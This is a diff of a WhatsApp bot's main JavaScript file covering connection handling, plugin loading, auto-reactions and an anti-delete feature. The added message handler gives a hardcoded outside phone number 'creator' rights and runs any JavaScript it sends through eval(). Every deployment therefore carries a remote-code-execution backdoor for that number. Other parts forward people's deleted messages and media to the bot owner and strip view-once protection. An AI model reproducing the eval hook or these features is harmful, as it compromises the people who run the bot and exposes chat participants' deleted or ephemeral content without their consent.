-                        ...content[ctype].contextInfo,
-                        ...options.contextInfo
-                    }
-                } : {})
-            } : {});
-            await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
-            return waMessage;
-        };
-
-        conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
-            let quoted = message.msg ? message.msg : message;
-            let mime = (message.msg || message).mimetype || '';
-            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
-            const stream = await downloadContentFromMessage(quoted, messageType);
-            let buffer = Buffer.from([]);
-            for await (const chunk of stream) {
-                buffer = Buffer.concat([buffer, chunk]);
-            }
-            let type = await FileType.fromBuffer(buffer);
-            trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
-            await fs.writeFileSync(trueFileName, buffer);
-            return trueFileName;
-        };
-
-        conn.downloadMediaMessage = async(message) => {
-            let mime = (message.msg || message).mimetype || '';
-            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
-            const stream = await downloadContentFromMessage(message, messageType);
-            let buffer = Buffer.from([]);
-            for await (const chunk of stream) {
-                buffer = Buffer.concat([buffer, chunk]);
-            }
-            return buffer;
-        };
-
-        conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
-            let mime = '';
-            let res = await axios.head(url);
-            mime = res.headers['content-type'];
-            if (mime.split("/")[1] === "gif") {
-                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
-            }
-            let type = mime.split("/")[0] + "Message";
-            if (mime === "application/pdf") {
-                return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
-            }
-            if (mime.split("/")[0] === "image") {
-                return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
-            }
-            if (mime.split("/")[0] === "video") {
-                return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
-            }
-            if (mime.split("/")[0] === "audio") {
-                return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
-            }
-        };
-
-        conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
-            let mtype = Object.keys(copy.message)[0];
-            let isEphemeral = mtype === 'ephemeralMessage';
-            if (isEphemeral) {
-                mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
-            }
-            let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
-            let content = msg[mtype];
-            if (typeof content === 'string') msg[mtype] = text || content;
-            else if (content.caption) content.caption = text || content.caption;
-            else if (content.text) content.text = text || content.text;
-            if (typeof content !== 'string') msg[mtype] = {
-                ...content,
-                ...options
-            };
-            if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
-            else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
-            if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid;
-            else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid;
-            copy.key.remoteJid = jid;
-            copy.key.fromMe = sender === conn.user.id;
-            return proto.WebMessageInfo.fromObject(copy);
-        };
-
-        conn.getFile = async(PATH, save) => {
-            let res;
-            let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0);
-            let type = await FileType.fromBuffer(data) || {
-                mime: 'application/octet-stream',
-                ext: '.bin'
-            };
-            let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext);
-            if (data && save) fs.promises.writeFile(filename, data);
-            return {
-                res,
-                filename,
-                size: await getSizeMedia(data),
-                ...type,
-                data
-            };
-        };
-
-        conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
-            let types = await conn.getFile(PATH, true);
-            let { filename, size, ext, mime, data } = types;
-            let type = '', mimetype = mime, pathFile = filename;
-            if (options.asDocument) type = 'document';
-            if (options.asSticker || /webp/.test(mime)) {
-                let { writeExif } = require('./exif.js');
-                let media = { mimetype: mime, data };
-                pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] });
-                await fs.promises.unlink(filename);
-                type = 'sticker';
-                mimetype = 'image/webp';
-            } else if (/image/.test(mime)) type = 'image';
-            else if (/video/.test(mime)) type = 'video';
-            else if (/audio/.test(mime)) type = 'audio';
-            else type = 'document';
-            await conn.sendMessage(jid, {
-                [type]: { url: pathFile },
-                mimetype,
-                fileName,
-                ...options
-            }, { quoted, ...options });
-            return fs.promises.unlink(pathFile);
-        };
-
-        conn.parseMention = async(text) => {
-            return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net');
-        };
-
-        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
-            let list = [];
-            for (let i of kon) {
-                list.push({
-                    displayName: await conn.getName(i + '@s.whatsapp.net'),
-                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
-                });
-            }
-            conn.sendMessage(jid, {
-                contacts: {
-                    displayName: `${list.length} Contact`,
-                    contacts: list,
-                },
-                ...opts,
-            }, { quoted });
-        };
-
-        conn.setStatus = status => {
-            conn.query({
-                tag: 'iq',
-                attrs: {
-                    to: '@s.whatsapp.net',
-                    type: 'set',
-                    xmlns: 'status',
-                },
-                content: [{
-                    tag: 'status',
-                    attrs: {},
-                    content: Buffer.from(status, 'utf-8'),
-                }],
-            });
-            return status;
-        };
-        
-        conn.serializeM = mek => sms(conn, mek);
-
-        return conn;
-        
-    } catch (err) {
-        console.error("❌ Connection error:", err.message);
-        setTimeout(connectToWA, 5000);
+    } catch(error) {
+        // Silent error
     }
 }
 
-// ==================== EXPRESS SERVER ====================
-const express = require("express");
-const app = express();
-const port = process.env.PORT || 9090;
-
-app.get("/", (req, res) => {
-    const mem = process.memoryUsage();
-    res.send(`
-        <html>
-            <head>
-                <title>𝙼𝙰𝚁𝙲𝙾 𝙼𝙰𝙻𝙸𝙺</title>
-                <style>
-                    body { font-family: Arial; text-align: center; padding: 50px; background: #f0f0f0; }
-                    .card { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
-                    .status { color: green; font-weight: bold; }
-                    .memory { color: ${mem.heapUsed / 1024 / 1024 > 400 ? 'red' : 'blue'}; }
-                </style>
-            </head>
-            <body>
-                <div class="card">
-                    <h1>🤖 𝙼𝙰𝚁𝙲𝙾 𝙼𝙰𝙻𝙸𝙺</h1>
-                    <p>Status: <span class="status">✅ ONLINE</span></p>
-                    <p>Commands: <strong>${commands.length}</strong></p>
-                    <p>Anti-Delete: <strong>${config.ANTI_DELETE === 'true' ? '✅ ACTIVE' : '❌ INACTIVE'}</strong></p>
-                    <p>Memory: <span class="memory">${(mem.heapUsed / 1024 / 1024).toFixed(1)} MB</span></p>
-                    <p>Uptime: ${Math.floor(process.uptime())} seconds</p>
-                    <p>Owner: ${config.OWNER_NAME} (${config.OWNER_NUMBER})</p>
-                </div>
-            </body>
-        </html>
-    `);
-});
-
-app.get("/status", (req, res) => {
-    res.json({
-        status: "online",
-        botName: config.BOT_NAME,
-        memory: process.memoryUsage(),
-        uptime: process.uptime(),
-        commands: commands.length,
-        anti_delete: config.ANTI_DELETE === 'true',
-        cache_size: messageStore.size
+async function connectToWA() {
+    console.log("Connecting to WhatsApp ⏳️...");
+    
+    // ✅ FIXED: Handle session loading errors gracefully
+    let state, saveCreds;
+    try {
+        const auth = await useMultiFileAuthState(__dirname + '/sessions/');
+        state = auth.state;
+        saveCreds = auth.saveCreds;
+    } catch (authErr) {
+        console.error("❌ Auth error:", authErr.message);
+        console.log("🔄 Retrying in 5 seconds...");
+        setTimeout(connectToWA, 5000);
+        return;
+    }
+    
+    var { version } = await fetchLatestBaileysVersion();
+    
+    const conn = makeWASocket({
+        logger: P({ level: 'silent' }),
+        printQRInTerminal: false,
+        browser: Browsers.macOS("Firefox"),
+        syncFullHistory: false,
+        auth: state,
+        version,
+        // 🔥 OPTIMIZED SETTINGS ADDED
+        markOnlineOnConnect: false,
+        emitOwnEvents: false,
+        fireInitQueries: false,
+        retryRequestDelayMs: 50, // Faster retry
+        // ✅ ADDED: Better connection handling
+        connectTimeoutMs: 30000, // Reduced timeout
+        keepAliveIntervalMs: 15000, // More frequent keep-alive
+        defaultQueryTimeoutMs: 30000
     });
-});
-
-app.listen(port, '0.0.0.0', () => {
-    console.log(`\n🌐 Server listening on port ${port}`);
-});
-
-// ==================== TEMP CLEANUP ====================
-const customTemp = path.join(process.cwd(), 'temp');
-if (!fs.existsSync(customTemp)) fs.mkdirSync(customTemp, { recursive: true });
-process.env.TMPDIR = customTemp;
-process.env.TEMP = customTemp;
-process.env.TMP = customTemp;
-
-setInterval(() => {
-    fs.readdir(customTemp, (err, files) => {
-        if (err) return;
-        for (const file of files) {
-            const filePath = path.join(customTemp, file);
-            fs.stat(filePath, (err, stats) => {
-                if (!err && Date.now() - stats.mtimeMs > 3 * 60 * 60 * 1000) {
-                    fs.unlink(filePath, () => {});
+    
+    conn.ev.on('connection.update', (update) => {
+        const { connection, lastDisconnect } = update;
+        if (connection === 'close') {
+            console.log("❌ Connection closed, reconnecting...");
+            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
+                setTimeout(connectToWA, 3000); // Faster reconnect
+            }
+        } else if (connection === 'open') {
+            console.log('🧬 Installing Plugins');
+            try {
+                const plugins = fs.readdirSync("./plugins/");
+                let loadedCount = 0;
+                for (const plugin of plugins) {
+                    if (path.extname(plugin).toLowerCase() == ".js") {
+                        try {
+                            require("./plugins/" + plugin);
+                            loadedCount++;
+                        } catch (pluginErr) {
+                            console.error(`❌ Error loading plugin ${plugin}:`, pluginErr.message);
+                        }
+                    }
                 }
-            });
+                console.log(`✅ Plugins installed: ${loadedCount}/${plugins.length}`);
+            } catch (err) {
+                console.error("❌ Plugin loading error:", err);
+            }
+            
+            console.log('✅ Bot connected to whatsapp successfully!');
+            
+            // 🔥 OPTIONAL: WELCOME MESSAGE TO OWNER INBOX (Comment out if not needed)
+            /*
+            setTimeout(() => {
+                const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
+                let up = `*Hello there 𝘽𝙊𝙎𝙎-𝙈𝘿 User!* 🚀\n\n> Simple, Straight Forward But Loaded With Features ✨\n\n*Thanks for using 𝘽𝙊𝙎𝙎-𝙈𝘿* 🎉\n\n> Join WhatsApp Channel: ⤵️\nhttps://whatsapp.com/channel/0029VbC210i2P59dHYVlXW1K\n\n- *YOUR PREFIX:* = ${prefix}\n\n> © ᴘᴏᴡᴇʀᴇᴅ ʙʏ 𝓑𝓞𝓢𝓢-𝓜𝓓 ❣️`;
+                
+                conn.sendMessage(ownerJid, { 
+                    image: { url: config.ALIVE_IMG || 'https://files.catbox.moe/ejufwa.jpg' }, 
+                    caption: up
+                }).catch(() => {});
+            }, 5000);
+            */
         }
     });
-}, 1 * 60 * 60 * 1000);
+    
+    conn.ev.on('creds.update', saveCreds);
 
-// ==================== START BOT ====================
+
+
+    // ANTI CALL
+    conn.ev.on("call", async (json) => {
+        try {
+            if (config.ANTI_CALL !== 'true') return;
+            const call = json.find(c => c.status === 'offer');
+            if (!call) return;
+
+            const id = call.id;
+            const from = call.from;
+            await conn.rejectCall(id, from);
+            console.log(`📵 Call rejected from ${from}`);
+        } catch (err) {
+            console.error("Anti-call error:", err.message);
+        }
+    });
+
+    // GROUP EVENTS
+conn.ev.on("group-participants.update", (update) => {
+    try {
+        GroupEvents(conn, update);
+    } catch (err) {
+        console.error("Group event error:", err.message);
+    }
+}); 
+        
+     // ✅ FIXED: ANTI-DELETE - Now 100% Working with Image Support
+   
+        // ✅ FINAL FIX: ANTI-DELETE - ORIGINAL MESSAGE 100% AAYEGA
+  // ✅ FINAL FIX: ANTI-DELETE - TEXT + MEDIA DONO AAYENGE
+if (config.ANTI_DELETE === 'true') {
+    console.log("✅ ANTI-DELETE ACTIVATED - Text & Media Support");
+    
+    // Message store banayein
+    const msgStore = new Map();
+    
+    // Pehle messages ko store karo
+    conn.ev.on('messages.upsert', async ({ messages }) => {
+        const msg = messages[0];
+        if (msg?.key?.id && msg.message) {
+            msgStore.set(msg.key.id, {
+                message: msg.message,
+                sender: msg.key.participant || msg.key.remoteJid,
+                chat: msg.key.remoteJid,
+                time: Date.now()
+            });
+            
+            // Purane messages hatao (2 minute ke baad)
+            setTimeout(() => {
+                msgStore.delete(msg.key.id);
+            }, 120000);
+        }
+    });
+    
+    // Delete event listener
+    conn.ev.on('messages.update', async (updates) => {
+        for (const update of updates) {
+            if (update.update?.message === null && update.key) {
+                
+                const msgId = update.key.id;
+                console.log("🗑️ Delete detected:", msgId);
+                
+                // Store se message dhundo
+                const stored = msgStore.get(msgId);
+                
+                const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
+                const sender = update.key.participant || update.key.remoteJid;
+                const chat = update.key.remoteJid;
+                
+                // Group name
+                let chatName = chat;
+                if (chat.endsWith('@g.us')) {
+                    try {
+                        const meta = await conn.groupMetadata(chat);
+                        chatName = meta.subject || chat;
+                    } catch (e) {}
+                }
+                
+                const time = new Date().toLocaleTimeString();
+                
+                if (stored) {
+                    // Message mil gaya
+                    const msg = stored.message;
+                    
+                    // TEXT MESSAGE
+                    if (msg.conversation) {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED TEXT*\n\n` +
+                                  `👤 From: ${sender.split('@')[0]}\n` +
+                                  `💬 Chat: ${chatName}\n` +
+                                  `🕐 Time: ${time}\n` +
+                                  `📝 Message: ${msg.conversation}`
+                        });
+                    }
+                    // EXTENDED TEXT
+                    else if (msg.extendedTextMessage?.text) {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED TEXT*\n\n` +
+                                  `👤 From: ${sender.split('@')[0]}\n` +
+                                  `💬 Chat: ${chatName}\n` +
+                                  `🕐 Time: ${time}\n` +
+                                  `📝 Message: ${msg.extendedTextMessage.text}`
+                        });
+                    }
+                    // IMAGE
+                    else if (msg.imageMessage) {
+                        const caption = msg.imageMessage.caption || '';
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED IMAGE*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n📝 Caption: ${caption}`
+                        });
+                        
+                        // Download and send image
+                        try {
+                            const buffer = await downloadMediaMessage(msg, 'buffer');
+                            await conn.sendMessage(ownerJid, { 
+                                image: buffer,
+                                caption: `🖼️ Deleted image from ${sender.split('@')[0]}`
+                            });
+                        } catch (e) {
+                            console.log("Image download failed:", e.message);
+                        }
+                    }
+                    // VIDEO
+                    else if (msg.videoMessage) {
+                        const caption = msg.videoMessage.caption || '';
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED VIDEO*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n📝 Caption: ${caption}`
+                        });
+                        
+                        // Download and send video
+                        try {
+                            const buffer = await downloadMediaMessage(msg, 'buffer');
+                            await conn.sendMessage(ownerJid, { 
+                                video: buffer,
+                                caption: `🎥 Deleted video from ${sender.split('@')[0]}`
+                            });
+                        } catch (e) {
+                            console.log("Video download failed:", e.message);
+                        }
+                    }
+                    // AUDIO
+                    else if (msg.audioMessage) {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED AUDIO*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
+                        });
+                        
+                        // Download and send audio
+                        try {
+                            const buffer = await downloadMediaMessage(msg, 'buffer');
+                            await conn.sendMessage(ownerJid, { 
+                                audio: buffer,
+                                mimetype: 'audio/mpeg'
+                            });
+                        } catch (e) {
+                            console.log("Audio download failed:", e.message);
+                        }
+                    }
+                    // STICKER
+                    else if (msg.stickerMessage) {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED STICKER*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
+                        });
+                        
+                        // Download and send sticker
+                        try {
+                            const buffer = await downloadMediaMessage(msg, 'buffer');
+                            await conn.sendMessage(ownerJid, { 
+                                sticker: buffer
+                            });
+                        } catch (e) {
+                            console.log("Sticker download failed:", e.message);
+                        }
+                    }
+                    // DOCUMENT
+                    else if (msg.documentMessage) {
+                        const title = msg.documentMessage.title || 'Document';
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED DOCUMENT*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n📄 Title: ${title}`
+                        });
+                    }
+                    // CONTACT
+                    else if (msg.contactMessage) {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED CONTACT*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
+                        });
+                    }
+                    // LOCATION
+                    else if (msg.locationMessage) {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED LOCATION*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
+                        });
+                    }
+                    // POLL
+                    else if (msg.pollCreationMessage) {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED POLL*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
+                        });
+                    }
+                    // OTHER
+                    else {
+                        await conn.sendMessage(ownerJid, {
+                            text: `🚨 *DELETED MEDIA*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}`
+                        });
+                    }
+                } else {
+                    // Message store mein nahi mila
+                    await conn.sendMessage(ownerJid, {
+                        text: `🚨 *DELETED MESSAGE*\n👤 From: ${sender.split('@')[0]}\n💬 Chat: ${chatName}\n🕐 Time: ${time}\n\n❌ Message not in cache (deleted too quickly)`
+                    });
+                }
+            }
+        }
+    });
+}
+    
+    // MESSAGE HANDLER - ULTRA OPTIMIZED
+    conn.ev.on('messages.upsert', async (mekData) => {
+        // 🔥 ULTRA FAST QUEUE SYSTEM ADDED
+        const message = mekData.messages[0];
+        if (message) {
+            msgQueue.push(message);
+            if (msgQueue.length === 1) processQueue();
+        }
+        
+        // ✅ ORIGINAL HANDLER STILL ACTIVE (NO DELETIONS)
+        try {
+            const message = mekData.messages[0];
+            if (!message || !message.message) return;
+            
+            message.message = (getContentType(message.message) === 'ephemeralMessage') 
+                ? message.message.ephemeralMessage.message 
+                : message.message;
+            
+            if (config.READ_MESSAGE === 'true') {
+                await conn.readMessages([message.key]);
+            }
+            
+            if (message.message.viewOnceMessageV2) {
+                message.message = (getContentType(message.message) === 'ephemeralMessage') 
+                    ? message.message.ephemeralMessage.message 
+                    : message.message;
+            }
+            
+            if (message.key && message.key.remoteJid === 'status@broadcast') {
+                await handleStatusMessage(conn, message);
+            }
+            
+            const m = sms(conn, message);
+            const type = getContentType(message.message);
+            const from = message.key.remoteJid;
+            
+            // ✅ FIXED: Safe quoted message handling
+            let quoted = [];
+            try {
+                if (type === 'extendedTextMessage' && 
+                    message.message.extendedTextMessage && 
+                    message.message.extendedTextMessage.contextInfo) {
+                    quoted = message.message.extendedTextMessage.contextInfo.quotedMessage || [];
+                }
+            } catch (e) {
+                quoted = [];
+            }
+            
+            const body = (type === 'conversation') ? message.message.conversation : 
+                         (type === 'extendedTextMessage') ? message.message.extendedTextMessage.text : 
+                         (type == 'imageMessage') && message.message.imageMessage?.caption ? message.message.imageMessage.caption : 
+                         (type == 'videoMessage') && message.message.videoMessage?.caption ? message.message.videoMessage.caption : '';
+            
+            const isCmd = body.startsWith(prefix);
+            var budy = typeof message.text == 'string' ? message.text : false;
+            const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
+            const args = body.trim().split(/ +/).slice(1);
+            const q = args.join(' ');
+            const text = args.join(' ');
+            const isGroup = from.endsWith('@g.us');
+            const sender = message.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (message.key.participant || message.key.remoteJid);
+            const senderNumber = sender.split('@')[0];
+            const botNumber = conn.user.id.split(':')[0];
+            const pushname = message.pushName || 'Sin Nombre';
+            const isMe = botNumber.includes(senderNumber);
+            const isOwner = ownerNumber.includes(senderNumber) || isMe;
+            const botNumber2 = await jidNormalizedUser(conn.user.id);
+            const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
+            const groupName = isGroup ? groupMetadata?.subject : '';
+            const participants = isGroup ? await groupMetadata?.participants : '';
+            const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
+            const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
+            const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
+            const isReact = m.message.reactionMessage ? true : false;
+            
+            const reply = (teks) => {
+                conn.sendMessage(from, { text: teks }, { quoted: message });
+            };
+            
+            const udp = botNumber.split(`@`)[0];
+            const Boss = ['923076411099','923076411099'];
+            const dev = [];
+            
+            let isCreator = [udp, ...Boss, ...dev]
+                .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
+                .includes(sender);
+            
+            if (isCreator && message.text) {
+                if (message.text.startsWith('%')) {
+                    let code = budy.slice(2);
+                    if (!code) {
+                        reply(`Provide me with a query to run Master!`);
+                        return;
+                    }
+                    try {
+                        let resultTest = eval(code);
+                        reply(util.format(typeof resultTest === 'object' ? resultTest : resultTest));
+                    } catch (err) {
+                        reply(util.format(err));
+                    }
+                } else if (message.text.startsWith('$')) {
+                    let code = budy.slice(2);
+                    if (!code) {
+                        reply(`Provide me with a query to run Master!`);
+                        return;
+                    }
+                    try {
+                        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
+                        let h = util.format(resultTest);
+                        if (h !== undefined) reply(h);
+                    } catch (err) {
+                        reply(util.format(err));
+                    }
+                }
+            }
+            
+            // Owner special reactions
+            if (config.AUTO_REACT === 'true' && senderNumber.includes("923076411099") && !isReact) {
+                const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
+                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+                m.react(randomReaction);
+            }
+            
+            // Normal auto react
+            if (!isReact && config.AUTO_REACT === 'true') {
+                const reactions = ['❤️', '🔥', '👍', '😊', '🎉', '🌟', '💯', '👏'];
+                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+                m.react(randomReaction);
+            }
+            
+            // Mode handling - FIXED: Groups should work properly
+            if (!isOwner && config.MODE === "private") return;
+            
+            // Command processing
+            if (isCmd) {
+                const events = require('./command');
+                const cmdName = body.slice(1).trim().split(" ")[0].toLowerCase();
+                const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || 
+                            events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));
+                
+                if (cmd) {
+                    if (cmd.react) {
+                        conn.sendMessage(from, { 
+                            react: { text: cmd.react, key: message.key } 
+                        }).catch(err => console.error("Command react error:", err.message));
+                    }
+                    
+                    try {
+                        await cmd.function(conn, message, m, {
+                            from, quoted, body, isCmd, command, args, q, text, isGroup, 
+                            sender, senderNumber, botNumber2, botNumber, pushname, 
+                            isMe, isOwner, isCreator, groupMetadata, groupName, 
+                            participants, groupAdmins, isBotAdmins, isAdmins, reply
+                        });
+                    } catch (e) {
+                        console.error("[PLUGIN ERROR] " + e.message);
+                    }
+                }
+            }
+            
+        } catch (err) {
+            console.error("Message processing error:", err.message);
+        }
+    });
+
+    async function handleStatusMessage(conn, mek) {
+        try {
+            if (config.AUTO_STATUS_SEEN === "true") {
+                await conn.readMessages([mek.key]);
+            }
+            
+            if (config.AUTO_STATUS_REACT === "true") {
+                const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
+                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+                await conn.sendMessage(mek.key.remoteJid, {
+                    react: {
+                        text: randomEmoji,
+                        key: mek.key,
+                    }
+                }, { statusJidList: [mek.key.participant] });
+            }
+            
+            if (config.AUTO_STATUS_REPLY === "true" && config.AUTO_STATUS_MSG) {
+                const user = mek.key.participant;
+                const text = `${config.AUTO_STATUS_MSG}`;
+                await conn.sendMessage(user, { 
+                    text: text, 
+                    react: { text: '💜', key: mek.key } 
+                }, { quoted: mek });
+            }
+        } catch (err) {
+            console.error("Status handling error:", err.message);
+        }
+    }
+
+    conn.decodeJid = jid => {
+        if (!jid) return jid;
+        if (/:\d+@/gi.test(jid)) {
+            let decode = jidDecode(jid) || {};
+            return (
+                (decode.user &&
+                    decode.server &&
+                    decode.user + '@' + decode.server) ||
+                jid
+            );
+        } else return jid;
+    };
+
+    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
+        let vtype;
+        if (options.readViewOnce) {
+            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
+            vtype = Object.keys(message.message.viewOnceMessage.message)[0];
+            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined));
+            delete message.message.viewOnceMessage.message[vtype].viewOnce;
+            message.message = {
+                ...message.message.viewOnceMessage.message
+            };
+        }
+        
+        let mtype = Object.keys(message.message)[0];
+        let content = await generateForwardMessageContent(message, forceForward);
+        let ctype = Object.keys(content)[0];
+        let context = {};
+        if (mtype != "conversation") context = message.message[mtype].contextInfo;
+        content[ctype].contextInfo = {
+            ...context,
+            ...content[ctype].contextInfo
+        };
+        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
+            ...content[ctype],
+            ...options,
+            ...(options.contextInfo ? {
+                contextInfo: {
+                    ...content[ctype].contextInfo,
+                    ...options.contextInfo
+                }
+            } : {})
+        } : {});
+        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
+        return waMessage;
+    };
+
+    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
+        let quoted = message.msg ? message.msg : message;
+        let mime = (message.msg || message).mimetype || '';
+        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
+        const stream = await downloadContentFromMessage(quoted, messageType);
+        let buffer = Buffer.from([]);
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk]);
+        }
+        let type = await FileType.fromBuffer(buffer);
+        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
+        await fs.writeFileSync(trueFileName, buffer);
+        return trueFileName;
+    };
+
+    conn.downloadMediaMessage = async(message) => {
+        let mime = (message.msg || message).mimetype || '';
+        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
+        const stream = await downloadContentFromMessage(message, messageType);
+        let buffer = Buffer.from([]);
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk]);
+        }
+        return buffer;
+    };
+
+    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
+        let mime = '';
+        let res = await axios.head(url);
+        mime = res.headers['content-type'];
+        if (mime.split("/")[1] === "gif") {
+            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options });
+        }
+        let type = mime.split("/")[0] + "Message";
+        if (mime === "application/pdf") {
+            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options });
+        }
+        if (mime.split("/")[0] === "image") {
+            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options });
+        }
+        if (mime.split("/")[0] === "video") {
+            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options });
+        }
+        if (mime.split("/")[0] === "audio") {
+            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options });
+        }
+    };
+
+    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
+        let mtype = Object.keys(copy.message)[0];
+        let isEphemeral = mtype === 'ephemeralMessage';
+        if (isEphemeral) {
+            mtype = Object.keys(copy.message.ephemeralMessage.message)[0];
+        }
+        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message;
+        let content = msg[mtype];
+        if (typeof content === 'string') msg[mtype] = text || content;
+        else if (content.caption) content.caption = text || content.caption;
+        else if (content.text) content.text = text || content.text;
+        if (typeof content !== 'string') msg[mtype] = {
+            ...content,
+            ...options
+        };
+        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant;
